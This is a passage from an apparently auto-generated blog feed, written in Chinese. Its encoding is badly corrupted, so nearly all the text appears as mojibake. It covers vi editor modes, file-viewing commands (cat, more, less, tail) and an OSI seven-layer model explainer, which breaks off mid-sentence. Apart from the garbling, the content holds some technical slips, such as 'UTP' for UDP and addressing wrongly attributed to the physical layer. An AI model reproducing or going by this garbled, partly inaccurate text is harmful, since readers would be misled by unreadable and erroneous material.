å°†æ–‡ä»¶ä¿å­˜æˆ–é€€å‡ºviï¼Œä¹Ÿå¯ä»¥è®¾ç½®ç¼–è¾‘ç¯å¢ƒï¼Œå¦‚å¯»æ‰¾å­—ç¬¦ä¸²ã€åˆ—å‡ºè¡Œå·â€¦â€¦ç­‰ã€‚<br>     åº•è¡Œæ¨¡å¼ä¸‹å¸¸ç”¨å‘½ä»¤ï¼š<br>     ã€1ã€‘é€€å‡ºç¼–è¾‘ï¼š   :q<br>     ã€2ã€‘å¼ºåˆ¶é€€å‡ºï¼š   :q!<br>     ã€3ã€‘ä¿å­˜å¹¶é€€å‡ºï¼š  :wq</p><p>æ‰“å¼€æ–‡ä»¶</p><p>å‘½ä»¤ï¼švi æ–‡ä»¶å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¤ºä¾‹ï¼šæ‰“å¼€å½“å‰ç›®å½•ä¸‹çš„aa.txtæ–‡ä»¶     vi aa.txt æˆ–è€… vim aa.txt</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šä½¿ç”¨viç¼–è¾‘å™¨æ‰“å¼€æ–‡ä»¶åï¼Œå¹¶ä¸èƒ½ç¼–è¾‘ï¼Œå› ä¸ºæ­¤æ—¶å¤„äºå‘½ä»¤æ¨¡å¼ï¼Œç‚¹å‡»é”®ç›˜i/a/oè¿›å…¥ç¼–è¾‘æ¨¡å¼ã€‚</p><p>ç¼–è¾‘æ–‡ä»¶</p><p>ä½¿ç”¨viç¼–è¾‘å™¨æ‰“å¼€æ–‡ä»¶åç‚¹å‡»æŒ‰é”®ï¼ši ï¼Œaæˆ–è€…oå³å¯è¿›å…¥ç¼–è¾‘æ¨¡å¼ã€‚</p><p>i:åœ¨å…‰æ ‡æ‰€åœ¨å­—ç¬¦å‰å¼€å§‹æ’å…¥<br>a:åœ¨å…‰æ ‡æ‰€åœ¨å­—ç¬¦åå¼€å§‹æ’å…¥<br>o:åœ¨å…‰æ ‡æ‰€åœ¨è¡Œçš„ä¸‹é¢å¦èµ·ä¸€æ–°è¡Œæ’å…¥</p><p>ä¿å­˜æˆ–è€…å–æ¶ˆç¼–è¾‘</p><p>ä¿å­˜æ–‡ä»¶ï¼š</p><p>ç¬¬ä¸€æ­¥ï¼šESC  è¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼<br>ç¬¬äºŒæ­¥ï¼š:     è¿›å…¥åº•è¡Œæ¨¡å¼<br>ç¬¬ä¸‰æ­¥ï¼šwq     ä¿å­˜å¹¶é€€å‡ºç¼–è¾‘</p><p>å–æ¶ˆç¼–è¾‘ï¼š</p><p>ç¬¬ä¸€æ­¥ï¼šESC  è¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼<br>ç¬¬äºŒæ­¥ï¼š:     è¿›å…¥åº•è¡Œæ¨¡å¼<br>ç¬¬ä¸‰æ­¥ï¼šq!     æ’¤é”€æœ¬æ¬¡ä¿®æ”¹å¹¶é€€å‡ºç¼–è¾‘</p><h4 id="æ–‡ä»¶çš„æŸ¥çœ‹ã€æŸ¥ã€‘"><a href="#æ–‡ä»¶çš„æŸ¥çœ‹ã€æŸ¥ã€‘" class="headerlink" title="æ–‡ä»¶çš„æŸ¥çœ‹ã€æŸ¥ã€‘"></a>æ–‡ä»¶çš„æŸ¥çœ‹ã€æŸ¥ã€‘</h4><p>æ–‡ä»¶çš„æŸ¥çœ‹å‘½ä»¤ï¼šcat/more/less/tail</p><p>catï¼šçœ‹æœ€åä¸€å±</p><p>ç¤ºä¾‹ï¼šä½¿ç”¨catæŸ¥çœ‹/etc/sudo.confæ–‡ä»¶ï¼Œåªèƒ½æ˜¾ç¤ºæœ€åä¸€å±å†…å®¹<br>cat sudo.conf</p><p>moreï¼šç™¾åˆ†æ¯”æ˜¾ç¤º</p><p>ç¤ºä¾‹ï¼šä½¿ç”¨moreæŸ¥çœ‹/etc/sudo.confæ–‡ä»¶ï¼Œå¯ä»¥æ˜¾ç¤ºç™¾åˆ†æ¯”ï¼Œå›è½¦å¯ä»¥å‘ä¸‹ä¸€è¡Œï¼Œç©ºæ ¼å¯ä»¥å‘ä¸‹ä¸€é¡µï¼Œqå¯ä»¥é€€å‡ºæŸ¥çœ‹<br>more sudo.conf</p><p>lessï¼šç¿»é¡µæŸ¥çœ‹</p><p>ç¤ºä¾‹ï¼šä½¿ç”¨lessæŸ¥çœ‹/etc/sudo.confæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨é”®ç›˜ä¸Šçš„PgUpå’ŒPgDnå‘ä¸Š    å’Œå‘ä¸‹ç¿»é¡µï¼Œqç»“æŸæŸ¥çœ‹<br>less sudo.conf</p><p>tailï¼šæŒ‡å®šè¡Œæ•°æˆ–è€…åŠ¨æ€æŸ¥çœ‹</p><p>ç¤ºä¾‹ï¼šä½¿ç”¨tail -10 æŸ¥çœ‹/etc/sudo.confæ–‡ä»¶çš„å10è¡Œï¼ŒCtrl+Cç»“æŸ<br>tail -10 sudo.conf</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;åŸºæœ¬linuxæ“ä½œ&quot;&gt;&lt;a href=&quot;#åŸºæœ¬linuxæ“ä½œ&quot; class=&quot;headerlink&quot; title=&quot;åŸºæœ¬linuxæ“ä½œ&quot;&gt;&lt;/a&gt;åŸºæœ¬linuxæ“ä½œ&lt;/h1&gt;&lt;h2 id=&quot;åŸºæœ¬çŸ¥è¯†ç§‘æ™®&quot;&gt;&lt;a href=&quot;#åŸºæœ¬çŸ¥è¯†ç§‘æ™®</summary>
      
    
    
    
    <category term="ç©è½¬PWN" scheme="https://pwnling.github.io/categories/%E7%8E%A9%E8%BD%ACPWN/"/>
    
    
  </entry>
  
  <entry>
    <title>OSIæ¨¡å‹</title>
    <link href="https://pwnling.github.io/2022/11/29/OSI/"/>
    <id>https://pwnling.github.io/2022/11/29/OSI/</id>
    <published>2022-11-29T15:00:00.000Z</published>
    <updated>2022-11-29T15:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="OSIä¸ƒå±‚æ¨¡å‹çš„è®¾è®¡çµæ„Ÿæ¥è‡ªå“ªé‡Œï¼Ÿ"><a href="#OSIä¸ƒå±‚æ¨¡å‹çš„è®¾è®¡çµæ„Ÿæ¥è‡ªå“ªé‡Œï¼Ÿ" class="headerlink" title="OSIä¸ƒå±‚æ¨¡å‹çš„è®¾è®¡çµæ„Ÿæ¥è‡ªå“ªé‡Œï¼Ÿ"></a>OSIä¸ƒå±‚æ¨¡å‹çš„è®¾è®¡çµæ„Ÿæ¥è‡ªå“ªé‡Œï¼Ÿ</h2><p>å½“å¹´åˆ¶å®šOSIæ¨¡å‹çš„ç ”ç©¶äººå‘˜ï¼Œåœ¨é…’å§å–é…’çš„æ—¶å€™ï¼ŒèŠèµ·äº†ç™½é›ªå…¬ä¸»è¿™éƒ¨ç”µå½±ï¼Œæœ‰äººå°±æé—®äº†ï¼šâ€œè¦æ˜¯çŸ¥é“ä¸ƒä¸ªå°çŸ®äººçš„åå­—ï¼Ÿè€å­å°±ç»™è°ç»­æ¯ï¼â€œè¿˜çœŸæœ‰äººæŠŠä¸ƒä¸ªåå­—å†™åœ¨äº†é¤å·¾ä¸Šï¼Œè¿™ä¸ªæ—¶å€™æœ‰ä½å…„å¼Ÿé…’ç²¾ä¸Šå¤´ï¼Œè¯´è¿™ä¸ƒä¸ªå°çŸ®äººä¸æ­£å¥½å¯ä»¥æ‹¿æ¥ä½œä¸ºç½‘ç»œæ¨¡å‹å—ï¼Ÿäºæ˜¯é¤å·¾éƒ½ä¸èˆå¾—æ‰”æ‰ã€‚ç¬¬äºŒå¤©ç ”ç©¶äººå‘˜å°±é—»ç€è¿™è¿˜å¸¦æœ‰é…’å‘³çš„é¤å·¾å¼€ä¼šï¼Œä¸€è‡´åŒæ„æŠŠç½‘ç»œæ¨¡å‹åˆ’åˆ†ä¸º7å±‚ï¼Œè¿™å°±æ˜¯æŠ˜ç£¨äººå¤šå¹´çš„OSIç½‘ç»œå‚è€ƒæ¨¡å‹ï¼Œæ³¨æ„æˆ‘è¿™é‡Œè¯´çš„æ˜¯å‚è€ƒï¼Œä¹Ÿå°±æ˜¯è¯´OSIç½‘ç»œå®é™…ä¸­å¹¶ä¸ä½¿ç”¨ï¼Œæˆ‘ä»¬åªæ˜¯æŠŠOSIç½‘ç»œæ¨¡å‹ä½œä¸ºå‚è€ƒã€‚</p><p>åœ¨ç½‘ç»œå‡ºç°é—®é¢˜çš„æ—¶å€™ï¼Œå¯ä»¥ä»ä¸€ä¸ªå®è§‚çš„æ•´ä½“å»åˆ†æå’Œè§£å†³é—®é¢˜ï¼Œè€Œä¸”æ­å»ºç½‘ç»œçš„æ—¶å€™ä¹Ÿå¹¶ä¸ä¸€å®šéœ€è¦åˆ’åˆ†ä¸º7å±‚ï¼Œä½†æ˜¯å½“ä»Šäº’è”ç½‘å¹¿æ³›ä½¿ç”¨çš„æ˜¯TCP/IPç½‘ç»œæ¨¡å‹ï¼ŒåŸæœ¬åªæœ‰4å±‚ï¼Œéšç€äººä»¬çš„ä¸æ–­å®è·µåå‘ç°ï¼Œå…¶å®åˆ’åˆ†ä¸º5å±‚ä¼šæ›´åŠ ç¬¦åˆå®é™….</p><h2 id="ä½†ä¸ºä»€ä¹ˆè¿˜è€é¢è¯•å®˜å–œæ¬¢é—®OSIæ¨¡å‹å‘¢ï¼Ÿ"><a href="#ä½†ä¸ºä»€ä¹ˆè¿˜è€é¢è¯•å®˜å–œæ¬¢é—®OSIæ¨¡å‹å‘¢ï¼Ÿ" class="headerlink" title="ä½†ä¸ºä»€ä¹ˆè¿˜è€é¢è¯•å®˜å–œæ¬¢é—®OSIæ¨¡å‹å‘¢ï¼Ÿ"></a>ä½†ä¸ºä»€ä¹ˆè¿˜è€é¢è¯•å®˜å–œæ¬¢é—®OSIæ¨¡å‹å‘¢ï¼Ÿ</h2><p>å…¶å®OSIä¸ƒå±‚çš„åå­—å¹¶ä¸éš¾è®°ï¼Œä¸ƒå±‚é‡Œçš„çŸ¥è¯†æ‰æ˜¯æœ€å¤æ‚çš„ï¼Œè°èƒ½æŠŠè¿™é‡Œå¤´çš„çŸ¥è¯†éƒ½å…³è”èµ·æ¥ï¼Œé‡åˆ°é—®é¢˜çš„æ—¶å€™å°±èƒ½å¿«é€Ÿå¤„ç†å’Œè§£å†³é—®é¢˜ã€‚OSIæ¨¡å‹çš„ç›®çš„å…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸ºäº†è§£å†³ä¸»æœºä¹‹é—´çš„ç½‘ç»œé€šè®¯ã€‚æ¯”æ–¹è¯´åä¸ºç”µè„‘è¦å’Œè‹¹æœç”µè„‘äº’è”ï¼Œä½†ä»–ä»¬æ˜¯ä¸åŒçš„å…¬å¸ï¼Œå°±æœ‰ç‚¹åƒæ™®é€šè¯å’Œè‹±è¯­è¿›è¡Œæ²Ÿé€šä¸€æ ·ï¼Œä½†æ˜¯å¦‚æœå¤§å®¶éƒ½ç»Ÿä¸€ç”¨OSIç½‘ç»œæ¨¡å‹æ¥æ²Ÿé€šï¼Œæƒ…å†µå°±ä¸ä¸€æ ·äº†ã€‚å‡è®¾ç°åœ¨è‹¹æœç”µè„‘è‡ªå·±ç”¨åº”ç”¨è½¯ä»¶æ­å»ºäº†ä¸ªç½‘ç«™ï¼Œåä¸ºç”µè„‘æƒ³è¦è®¿é—®è¿™ä¸ªç½‘ç«™å°±éœ€è¦é€šè¿‡è½¯ä»¶åº”ç”¨äº†ï¼Œæ¯”æ–¹è¯´ç”¨æµè§ˆå™¨è®¿é—®ç½‘ç«™ï¼Œä¸¤ä¸ªåº”ç”¨å…·ä½“éœ€è¦å¦‚ä½•è¿›è¡Œäº¤äº’å°±æ˜¯åº”ç”¨å±‚çš„äº‹æƒ…äº†ï¼Œåº”ç”¨å±‚å¹¶ä¸æ˜¯è¯´ä½ éœ€è¦ä½¿ç”¨ä»€ä¹ˆåº”ç”¨ç¨‹åºï¼Œè€Œæ˜¯åº”ç”¨å¦‚ä½•æ²Ÿé€šã€‚</p><p>å¸¸è§çš„<strong>åº”ç”¨å±‚</strong>åè®®å°±æ˜¯HTTPäº†ï¼Œå¼€å‘è€…å°±å¯ä»¥æ ¹æ®HTTPåè®®ç¼–å†™åº”ç”¨ç¨‹åºï¼Œä½¿å¾—åº”ç”¨ä¹‹é—´å¯ä»¥å®ç°æ²Ÿé€šï¼Œåº”ç”¨å±‚å°±æ˜¯æœ€æ¥è¿‘ç”¨æˆ·çš„é‚£ä¸€å±‚ï¼Œä½†æ˜¯åº”ç”¨å±‚åªä¸è¿‡æ˜¯é€»è¾‘ä¸ŠæŠŠä¸¤ä¸ªåº”ç”¨è¿é€šï¼Œå®é™…ç‰©ç†ä¸Šçš„è¿é€šæ˜¯éœ€è¦<strong>ç‰©ç†å±‚</strong>çš„ã€‚æˆ‘ä»¬è¦å‘é€å‡ºå»çš„æ•°æ®åœ¨è®¡ç®—æœºé‡Œåªä¸è¿‡æ˜¯æ— æ•°çš„0å’Œ1ï¼ˆ0æˆ–è€…1å°±å«åšæ¯”ç‰¹ï¼‰ç‰©ç†å±‚å°±è¦æŠŠè¿™äº›æ¯”ç‰¹ç”¨ä¸åŒçš„åª’ä»‹ä¼ è¾“å‡ºå»ï¼Œå¯ä»¥ç”¨ç”µï¼Œç”¨å…‰æˆ–è€…å…¶å®ƒå½¢å¼çš„ç”µç£æ³¢æ¥è¡¨ç¤ºå’Œä¼ è¾“ä¿¡å·ï¼Œæ•°æ®ä»ç½‘ç»œæ¥å£å‡ºå»ä»¥åä¼šç»è¿‡ä¸åŒçš„ç½‘ç»œæ‹“æ‰‘ï¼Œå¹¶ä¸æ˜¯ä¸€æ¡çº¿èµ°åˆ°åº•ï¼Œå› æ­¤éœ€è¦ä¸­ç»§å™¨å’Œé›†çº¿å™¨è¿™æ ·çš„è®¾å¤‡ã€‚ä½†è¿˜æ˜¯ä¸å¤Ÿï¼Œç‰©ç†å±‚ä¿¡å·è¦å»åˆ°å“ªå°è®¾å¤‡æ˜¯éœ€è¦å®šå‘çš„ï¼Œå› æ­¤éœ€è¦é«˜çº§ä¸€ç‚¹çš„ç½‘ç»œæ¨¡å‹ï¼Œåœ¨æ•°æ®é“¾è·¯å±‚è¿™é‡Œï¼Œæ¯”ç‰¹ä¼šè¢«å°è£…æˆ<strong>å¸§</strong>ï¼Œå¸§å°±æ˜¯è¿™ä¸€å±‚è¡¨ç¤ºæ•°æ®çš„ç‰¹æ®Šåå­—è€Œå·²ï¼Œåœ¨å°è£…çš„æ—¶å€™ä¼šåŠ ä¸Š<strong>MACåœ°å€ï¼ˆç‰©ç†åœ°å€ï¼‰</strong>ç½‘å¡å‡ºå‚çš„æ—¶å€™å°±æœ‰ç€å…¨çƒå”¯ä¸€çš„MACåœ°å€ï¼Œä¸ºäº†å¯ä»¥é€šè¿‡MACåœ°å€å¯¹ä¸åŒè®¾å¤‡è¿›è¡Œæ•°æ®çš„ä¼ è¾“ï¼Œå°±å‡ºç°äº†<strong>äº¤æ¢æœº</strong>ï¼Œè¿™é‡Œè¯´çš„æ˜¯äºŒå±‚äº¤æ¢æœºï¼Œæ¯”æ–¹è¯´è¿™é‡Œæœ‰ä¸€å°äº¤æ¢æœºï¼Œè¿æ¥å¤šå°ä¸»æœºï¼Œå‘é€ç«¯å‘é€æ•°æ®çš„æ—¶å€™ï¼Œäº¤æ¢æœºå°±çŸ¥é“äº†<strong>å‘é€ç«¯çš„MACåœ°å€</strong>ï¼Œå¦‚æœæ­¤æ—¶äº¤æ¢æœºä¹ŸçŸ¥é“<strong>æ¥æ”¶ç«¯çš„MACåœ°å€</strong>ï¼Œå°±å¯ä»¥æŠŠæ•°æ®ç›´æ¥å‘é€è¿‡å»äº†ï¼Œç‰©ç†åœ°å€å°±æ˜¯è¿™æ ·ä¸€è·³ä¸€è·³åœ°è¿›è¡Œä¼ é€’ï¼Œå¦å¤–å› ä¸ºç‰©ç†å±‚åœ¨ä¼ è¾“0å’Œ1çš„æ—¶å€™ï¼Œå¯èƒ½ä¼š0å˜æˆ1ï¼Œä»¥åŠä¸€å®šçš„å·®é”™çº æ­£ï¼Œå¦å¤–è®¾å¤‡ä¹‹é—´çš„ä¼ è¾“èƒ½åŠ›ä»¥åŠæ¥æ”¶èƒ½åŠ›ä¹Ÿæ˜¯ä¸ªé—®é¢˜ï¼Œâ€œå–·æ°´â€å¼ä¼ è¾“å¾ˆå¯èƒ½è¿™è¾¹â€œå¤¹ç¼â€å¼æ¥å—å¦ä¸€è¾¹ï¼Œå› æ­¤éœ€è¦æµæ§åˆ¶æ¥é¿å…è¿™ç§ä¸å¯¹ç§°ã€‚æˆ‘ä»¬çŸ¥é“äº’è”ç½‘æ˜¯ä¸€å¼ å¤§ç½‘ï¼Œ<strong>ç‰©ç†å±‚å¦‚æœç”¨MACç‰©ç†åœ°å€æ¥ä½œä¸ºå”¯ä¸€çš„å¯»å€æ–¹æ³•æ˜¯ä¸ç§‘å­¦çš„</strong>ï¼Œæ¯”å¦‚æˆ‘å’Œä½ ä¹°äº†åŒä¸€ä¸ªå‚å‡ºçš„ç½‘å¡ï¼Œæˆ‘å’Œä½ çš„ç½‘å¡å¦‚æœå·®åˆ«å°±åªæœ‰ä¸€ä¸ªå­—æ¯ï¼Œä½†æ˜¯æˆ‘å’Œä½ è·ç¦»åä¸‡å…«åƒé‡Œï¼Œç‰©ç†åœ°å€æ­¤æ—¶å°±å¾ˆéš¾åšå‡ºå¿«é€Ÿå®šä½ï¼Œç›¸å½“äºæˆ‘æœ‰ä½ çš„åå­—ï¼Œä½†ä¸çŸ¥é“ä½ ä½å“ªé‡Œï¼Œæ‰¾ä¸åˆ°ä½ ã€‚å› æ­¤éœ€è¦<strong>IPåœ°å€æ¥è¿›è¡Œå¯»å€å’Œè·¯ç”±é€‰æ‹©</strong>ï¼Œ<strong>IPè¿™æ ·çš„é€»è¾‘åœ°å€</strong>å°±æ˜¯å®ç°ç«¯åˆ°ç«¯çš„åŸºç¡€äº†ï¼Œè€Œä¸æ˜¯ç‰©ç†åœ°å€é‚£æ ·çš„è·³åˆ°è·³ä¼ è¾“ã€‚è¯´åˆ°è·¯ç”±é€‰æ‹©ï¼Œä¹Ÿå°±æ˜¯è¯´<strong>è·¯ç”±å™¨ä¹Ÿæ˜¯ç½‘ç»œå±‚çš„æ ¸å¿ƒ</strong>ï¼Œ<strong>åŒ…</strong>å°±æ˜¯ç½‘ç»œå±‚é‡Œæ•°æ®çš„åå­—ï¼Œåœ¨å°è£…ä¸ºäºŒå±‚çš„å¸§ä¹‹å‰å°±æ˜¯åŒ…ï¼Œè·¯ç”±å™¨æ ¹æ®åŒ…é‡Œçš„IPåœ°å€è¿›è¡Œè·¯ç”±è½¬å‘åœ°å€ç®¡ç†å’Œè·¯ç”±é€‰æ‹©å°±æ˜¯è¿™ä¸€å±‚çš„æ ¸å¿ƒï¼Œç‰©ç†å±‚è™½ç„¶æœ‰MACå’ŒIPåœ°å€å¯ä»¥æŠµè¾¾å¯¹æ–¹ä¸»æœºï¼Œä½†æ˜¯å¯¹æ–¹ä¸»æœºå¯èƒ½è¿è¡Œç€æ— æ•°å¤šä¸ªè½¯ä»¶è¿›ç¨‹ï¼Œå‡è®¾æˆ‘ç”¨è°·æ­Œå’Œç«ç‹æµè§ˆå™¨åŒæ—¶ç™»å½•ç½‘ç«™ï¼Œå¦‚ä½•è®©æ•°æ®å»åˆ°æŒ‡å®šçš„è½¯ä»¶æœåŠ¡ä¸Šï¼Œå°±éœ€è¦ç”¨åˆ°<strong>ç«¯å£å·</strong>ä½œä¸ºåœ°å€æ¥å®šä½äº†ï¼Œæ¯”å¦‚å®¢æˆ·ç«¯è¿™é‡Œç”Ÿæˆä¸åŒçš„ç«¯å£å·ï¼Œå³æ—¶åŒæ—¶è®¿é—®HTTPç«¯å£80ä¹Ÿæ˜¯æ²¡é—®é¢˜çš„ï¼Œæ ¹æ®ä¸åŒçš„æºç«¯å£å·æ¥ä½œå‡ºå“åº”å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥<strong>ä¼ è¾“å±‚</strong>åœ¨ç½‘ç»œå±‚çš„ç«¯åˆ°ç«¯åŸºç¡€ä¸Šï¼Œå®ç°äº†æœåŠ¡è¿›ç¨‹åˆ°æœåŠ¡è¿›ç¨‹çš„ä¼ è¾“ï¼Œ<strong>æ®µ</strong>å°±æ˜¯ä¼ è¾“å±‚é‡Œæ•°æ®çš„åå­—ï¼Œåœ¨å°è£…ä¸ºä¸‰å±‚åŒ…ä¹‹å‰å°±æ˜¯æ®µã€‚ä¼ è¾“å±‚ç®¡ç†ä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´æ•°æ®çš„ä¼ è¾“ï¼Œè´Ÿè´£å¯é ä¼ è¾“å’Œä¸å¯é ä¼ è¾“ï¼Œä¹Ÿå°±æ˜¯å¤§å®¶ç†ŸçŸ¥çš„åè®®TCPå’ŒUTPï¼Œå¦å¤–è¿˜æœ‰ä¸€ä¸ªæ–°çš„å«QUICï¼Œå…¶ä¸­TCPå…è®¸åº”ç”¨æŠŠå­—èŠ‚æµå˜æˆå¤šä»½æ®µï¼Œè€Œä¸æ˜¯æ•´ä¸ªå­—èŠ‚æ•°æ®å®Œæ•´åœ°å‘é€å‡ºå»ï¼Œä¼ è¾“å±‚è¿˜æœ‰<strong>æµé‡æ§åˆ¶</strong>æ¥ç¡®ä¿ä¼ è¾“é€Ÿåº¦ï¼Œå†åŠ ä¸Š<strong>é”™è¯¯æ§åˆ¶</strong>æ¥è¿›è¡Œæ•°æ®å®Œæ•´çš„æ¥æ”¶ï¼Œæ¥ä¸‹æ¥<strong>ä¼šè¯å±‚</strong>ä¹Ÿæ¯”è¾ƒå¥½ç†è§£ï¼Œæ¯”æ–¹è¯´ä½ ç°åœ¨ç™»å½•äº†æŸä¸ªç½‘ç«™ï¼Œç½‘ç«™æœåŠ¡å¯ä»¥ä¿æŒä½ çš„ç™»å½•çŠ¶æ€ï¼Œä¸ç”¨æ¯æ¬¡éƒ½è¾“å…¥è´¦å·å’Œå¯†ç ï¼Œå½“ç„¶ç½‘ç«™æœåŠ¡ä¼šç®¡ç†å’Œæ§åˆ¶ç™»å½•çŠ¶æ€ã€‚å¦å¤–ä¼šè¯å±‚è¿˜è´Ÿè´£åŒæ­¥æœåŠ¡ï¼Œæ¯”æ–¹è¯´ä½ ä¸Šæ¬¡çœ‹åˆ°ç”µå½±é«˜æ½®çš„æ—¶åˆ»çªç„¶åœç”µäº†ï¼Œå†æ¬¡ç™»å½•è´¦å·çš„æ—¶å€™ï¼Œå°±å¯ä»¥è‡ªåŠ¨åŒæ­¥åˆ°ä¸Šæ¬¡çœ‹åˆ°çš„æ—¶é—´æ®µï¼Œä¸åŒè®¡ç®—æœºå†…éƒ¨çš„å„è‡ªè¡¨è¾¾æ–¹å¼å¯èƒ½ä¸å¤ªç›¸åŒï¼Œ<strong>è¡¨ç¤ºå±‚</strong>å°±æ¥è´Ÿè´£è¿™æ ·çš„è½¬æ¢ï¼Œä¹Ÿå°±æ˜¯ç¼–ç å’Œè§£ç ã€‚æ•°æ®å¾€å¾€è¿˜éœ€è¦è¿›è¡ŒåŠ å¯†ï¼Œæ¯”æ–¹è¯´HTTPS(SSL/TLS)å°±ä¼šå¯¹æˆ‘ä»¬çš„æ•°æ®è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ï¼Œå¦å¤–æˆ‘ä»¬å¯èƒ½è¿˜éœ€è¦ç»™æ–‡ä»¶ç˜¦èº«ï¼Œå‹ç¼©ä¹Ÿæ˜¯è¿™ä¸€å±‚è´Ÿè´£çš„ï¼Œç‰©ç†å±‚ï¼Œåº”ç”¨å±‚ï¼Œè¡¨ç¤ºå±‚å’Œä¼šè¯å±‚çš„æ•°æ®ç»Ÿç§°ä¸ºåº”ç”¨æ•°æ®ï¼Œæˆ–è€…åº”ç”¨è´Ÿè½½ï¼Œä¹Ÿå¯ä»¥å«ä¸Šå±‚æ•°æ®ï¼ŒåŒæ—¶ä¹Ÿæ˜¯æ•™ç§‘ä¹¦ä¸Šè¯´çš„æŠ¥æ–‡ã€‚æ•°æ®åœ¨å„å±‚çš„åå­—åˆ†åˆ«æ˜¯ï¼šæŠ¥æ–‡ï¼Œæ®µï¼ŒåŒ…ï¼Œé¡¿å’Œæ¯”ç‰¹ã€‚æ¯”ç‰¹å°±åœ°å€æ¥è¯´ï¼Œæ¯”ç‰¹æœ‰ç«¯å£å·ï¼ŒIPé€»è¾‘åœ°å€å’ŒMACç‰©ç†åœ°å€ï¼›æ¯”ç‰¹å°±ä¼ è¾“åŠŸèƒ½æ¥è®²ï¼Œæ¯”ç‰¹æœ‰æœåŠ¡è¿›ç¨‹åˆ°æœåŠ¡è¿›ç¨‹ï¼Œæ¯”ç‰¹ç«¯åˆ°ç«¯ï¼Œè¿˜æœ‰è·³åˆ°è·³ã€‚</p><p>äº†è§£äº†å„å±‚çš„ä½œç”¨ï¼Œç°åœ¨å°±å¯ä»¥æŠŠå…¨éƒ¨å…³è”èµ·æ¥ï¼Œå®¢æˆ·ç«¯è¦å‘é€æ•°æ®ï¼Œä¹Ÿå°±æ˜¯æŠ¥æ–‡ã€‚æŠ¥æ–‡æ¥åˆ°äº†ä¼ è¾“å±‚ï¼ŒåŠ ä¸Šç«¯å£å·ï¼Œå°è£…æˆæ®µï¼›åŠ ä¸ŠIPåœ°å€ï¼Œå°è£…æˆåŒ…ï¼Œæ³¨æ„è¿™é‡Œçš„åŒ…æ˜¯å«æœ‰ç›®æ ‡IPåœ°å€çš„ï¼Œæ¯•ç«Ÿä½ è¦çŸ¥é“æ•°æ®è¦å‘é€åˆ°ä»€ä¹ˆåœ°æ–¹ï¼Œä½†å› ä¸ºç›®æ ‡IPåœ°å€ä¸æ˜¯åŒä¸€ä¸ªç½‘ç»œä¸‹çš„ï¼Œè¦å‘é€åˆ°å…¶å®ƒçš„ç½‘ç»œï¼Œå°±éœ€è¦ç»è¿‡é»˜è®¤ç½‘å…³ã€‚ç°åœ¨å°±å‡ºç°äº†ä¸ªé—®é¢˜ï¼Œå®¢æˆ·ç«¯ä¸»æœºæœ€åˆå¹¶ä¸çŸ¥é“é»˜è®¤ç½‘å…³çš„MACåœ°å€ï¼Œæ²¡æœ‰åŠæ³•å°è£…æˆå¸§ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç”¨ARPåè®®è¿›è¡Œå¹¿æ’­æ‰¾åˆ°ç½‘å…³IPå¯¹åº”çš„MACåœ°å€ï¼ŒæŠŠåŒ…å°è£…æˆé¡¿ï¼ŒæºMACåœ°å€å¡«è‡ªå·±çš„ã€‚å‡è®¾å½“å‰ç½‘ç»œæœ‰ä¸ªäºŒå±‚äº¤æ¢æœºï¼Œè¿™ä¸ªäº¤æ¢æœºåªéœ€è¦è®°å½•ä¸‹ä¸åŒçš„æ¥å£å¯¹åº”çš„MACåœ°å€å°±å¥½äº†ï¼Œäº¤æ¢æœºæ”¶åˆ°å¹¿æ’­åå°±å¸®å¿™å‘é€å‡ºå»ï¼Œäººæ‰‹ä¸€ä»½ï¼Œæ‰€ä»¥é»˜è®¤ç½‘å…³æ”¶åˆ°æ¶ˆæ¯åï¼ŒæŸ¥çœ‹äº†é¡¿ï¼Œå‘ç°äº†å‘é€ç«¯çš„MACåœ°å€ï¼Œå†è§£å°å‘ç°åŒ…é‡Œé¢çš„IPåœ°å€ï¼Œå°±ä¼šæŠŠå®¢æˆ·ç«¯MACåœ°å€å’ŒIPåœ°å€å…³è”ä¸ºä¸€å°ä¸»æœºï¼ŒåŒæ—¶é»˜è®¤ç½‘å…³ä¼šæŠŠè‡ªå·±çš„IPåœ°å€æ”¾å…¥åŒ…é‡Œï¼Œå†ç»“åˆè‡ªå·±çš„MACåœ°å€å°è£…æˆé¡¿ï¼Œé»˜è®¤ç½‘å…³å°±è¿™æ ·ä½œå‡ºå“åº”ï¼Œå‘é€ç«¯å°±çŸ¥é“é»˜è®¤ç½‘å…³çš„MACåœ°å€äº†ç°åœ¨å°±å¯ä»¥å°è£…æˆé¡¿ï¼Œå¹¶ä¸”å‘é€æ•°æ®ï¼Œæ¯”ç‰¹æµåˆ°äº†é»˜è®¤ç½‘å…³çš„æ—¶å€™<br>è§£å°ä¸ºé¡¿å‘ç°æ˜¯å‘é€ç»™è‡ªå·±çš„ï¼Œå†è§£å°ä¸ºåŒ…æŸ¥çœ‹åˆ°ç›®æ ‡IPåœ°å€æ˜¯åœ¨å¦ä¸€ç½‘ç»œä¸­çš„ï¼ŒæœåŠ¡å™¨å°±ä¼šè¿›è¡Œè·¯ç”±è½¬å‘<br>æœåŠ¡å™¨æœ€ç»ˆåˆ°è¾¾äº†ç›®çš„ç½‘ç»œï¼ŒæœåŠ¡å™¨å¦‚æœç›®æ ‡çš„ç½‘å…³çŸ¥é“ç›®æ ‡IPåœ°å€å’ŒMACåœ°å€æ˜¯å“ªå°ä¸»æœºï¼ŒæœåŠ¡å™¨å°è£…æˆä¸ºå¸§å°±å¯ä»¥ç›´æ¥å‘é€è¿‡å»äº†ï¼Œå¦‚æœä¸çŸ¥é“ä¹Ÿè¿˜æ˜¯å¯ä»¥ç”¨ARPå–Šä¸‹è¡—å°±å¥½ï¼Œä¸»æœºæ”¶åˆ°åŒ…ç¡®è®¤æ˜¯è‡ªå·±çš„IPåœ°å€ä»¥åï¼Œè§£å°æŸ¥çœ‹æ®µå¯ä»¥å‘ç°æºå’Œç›®æ ‡ç«¯å£å·ï¼Œç”¨ç›®æ 